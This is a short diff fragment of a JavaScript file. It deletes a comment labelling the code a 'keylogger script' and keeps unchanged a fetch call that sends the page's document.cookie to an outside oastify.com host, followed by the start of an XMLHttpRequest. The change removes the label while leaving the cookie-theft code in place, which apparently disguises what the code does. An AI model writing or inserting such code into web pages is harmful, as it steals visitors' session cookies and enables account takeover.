@@ -1,4 +1,3 @@
-//keylogger script
 let currSession="";
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
 let xhr = new XMLHttpRequest();
